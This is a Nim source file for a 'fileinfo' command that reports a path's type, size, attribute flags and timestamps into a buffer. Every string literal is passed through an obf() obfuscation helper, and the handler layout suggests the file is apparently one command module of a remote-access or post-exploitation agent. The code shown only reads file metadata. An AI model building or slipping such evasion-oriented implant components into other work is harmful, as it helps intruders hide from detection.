import std/strutils
from posix import Stat, Timespec, Time, Tm, S_ISDIR, localtime_r, strftime
import ../utils/global
import ../utils/general/strings
import ../utils/linapi/handlers
import ../utils/linapi/utils
import ../utils/msg

proc run_fileinfo*(args: string; buf: var openArray[char]): int =
  # Builds a file info report and writes it
  let path = args.strip()
  if path.len == 0:
    return writeErr(obf("missing path"), buf)
  if path.len >= pathMax:
    return writeErr(obf("path too long"), buf)
  var st: Stat
  if not pathStat(path, st):
    return writeErr(obf("path not found"), buf)
  let isDir = S_ISDIR(st.st_mode)
  let sz = st.st_size.uint64
  var sizeHuman = obf("-")
  if not isDir:
    var sizeBuf: array[24, char]
    let sn = fmtSize(sz, sizeBuf)
    if sn > 0:
      sizeHuman = newString(sn)
      copyMem(addr sizeHuman[0], addr sizeBuf[0], sn)
    else:
      sizeHuman = $sz
  let attrs = uint32(st.st_mode)
  var attrLbl = ""
  if isDir:
    attrLbl.add obf("D")
  var base = path
  let slash = base.rfind('/')
  if slash >= 0:
    base = base[slash + 1 .. ^1]
  if base.len > 0 and base[0] == '.':
    attrLbl.add obf("H")
  if (st.st_mode and 0o200) == 0:
    attrLbl.add obf("R")
  if attrLbl.len == 0:
    attrLbl = obf("-")
  var report = obf("path: ") & path & '\n'
  report.add obf("type: ") & (if isDir: obf("directory") else: obf("file")) & '\n'
  report.add obf("size: ") & sizeHuman & obf(" (") & $sz & obf(" bytes)\n")
  report.add obf("attributes: 0x") & toHex(attrs, 8) & ' ' & attrLbl & '\n'
  for (label, ts) in [
    (obf("created"), Timespec(tv_sec: Time(0), tv_nsec: 0)),
    (obf("accessed"), st.st_atim),
    (obf("modified"), st.st_mtim),
  ]:
    var at = obf("-")
    if int(ts.tv_sec) != 0:
      var tm: Tm
      var sec = ts.tv_sec
      if localtime_r(sec, tm) != nil:
        var dateBuf: array[32, char]
        if strftime(cast[cstring](addr dateBuf[0]), dateBuf.len, mtimeFmt, tm) > 0:
          at = $cast[cstring](addr dateBuf[0])
    report.add(label & obf(": ") & at & '\n')
  writeMsg(report, buf)
